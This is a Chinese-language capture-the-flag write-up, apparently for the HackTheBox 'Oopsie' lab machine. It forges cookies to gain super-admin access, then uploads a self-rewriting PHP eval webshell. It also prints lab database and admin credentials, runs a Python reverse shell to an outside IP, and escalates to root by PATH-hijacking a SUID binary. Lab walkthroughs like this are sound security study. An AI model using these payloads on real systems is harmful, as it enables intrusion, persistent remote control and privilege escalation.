nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141459039.png)

---

题目提示要进行登录操作,发现存在路径`cdn-cgi/login`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141522417.png)

[Login as guest](http://10.129.21.248/cdn-cgi/login/admin.php)跳转到`cdn-cgi/login/admin.php`

点击account,注意到`?content=accounts&id=2`,id参数可能存在注入??

发现对于不同的id,回显的结果不同,用intruder进行爆破

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141644629.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141643534.png)

[文件上传](http://10.129.21.248/cdn-cgi/login/admin.php?content=uploads)

提示要super admin权限

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141802996.png)

注意到在`Cookie`中定义了`user`和`role`,网站可能根据cookie来判断用户身份,根据爆破得到的id和name替换cookie中的值,成功冒充super admin

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141805958.png)

上传webshell即可,但发现疑似存在定时清理程序,因此上传不死马

```php
<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = 'shell.php';
$code = '<?php @eval($_POST[a]);?>';
while (1){
    file_put_contents($file,$code);
    usleep(1000);
}
?>
```

在`/var/www/html/cdn-cgi/login/admin.php`中

```php
if($_GET["content"]==="clients"&&$_GET["orgId"]!="")
{
	$stmt=$conn->prepare("select name,email from clients where id=?");
	$stmt->bind_param('i',$_GET["orgId"]);
	$stmt->execute();
	$stmt=$stmt->get_result();
	$stmt=$stmt->fetch_assoc();
	$name=$stmt["name"];
	$email=$stmt["email"];
	echo '<table><tr><th>Client ID</th><th>Name</th><th>Email</th></tr><tr><td>'.$_GET["orgId"].'</td><td>'.$name.'</td><td>'.$email.'</td></tr></table';
}
```

在`/var/www/html/cdn-cgi/login/db.php`中

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

可能可以作为`robert`用户的密码

在`/var/www/html/cdn-cgi/login/index.php`中

```php
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
{
	$cookie_name = "user";
	$cookie_value = "34322";
	setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/");
	setcookie('role','admin', time() + (86400 * 30), "/");
	header('Location: /cdn-cgi/login/admin.php');
}
```

存在python3,利用其进行反弹shell


```python
import socket
import subprocess
import os
ip="10.10.16.45"
port=8000
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((ip,port));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

将反弹回来的shell转换为交互式的shell

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141956768.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141957154.png)

可以通过ssh直接连接

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201141725083.png)

题目提示存在`SUID`

`find / -user root -perm -4000 -print 2>/dev/null`

```bash
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:~$ find / -user root -perm -4000 -print 2>/dev/null
/snap/core/11420/bin/mount
...
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

发现`/usr/bin/bugtracker`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142000440.png)

该程序根据输入执行`cat /root/reports/xxx`,注意到这里的`cat`可能为相对路径,因此可能可以利用`SUID`进行提权操作

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142011724.png)

确实是直接使用了相对路径的`cat`,因此可以进行提权操作

改变当前目录的`PATH`,使`robert`执行`bugtracker`时优先使用当前的`PATH`变量

假设将`PATH`设置为`/tmp`目录,而在`/tmp`目录下存在一个名为`cat`的可执行文件,文件内容为`/bin/bash`,在执行`bugtracker`会以`root`权限执行`/bin/bash`由此获得`root shell`

`export PATH=/tmp:$PATH`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142017367.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142018460.png)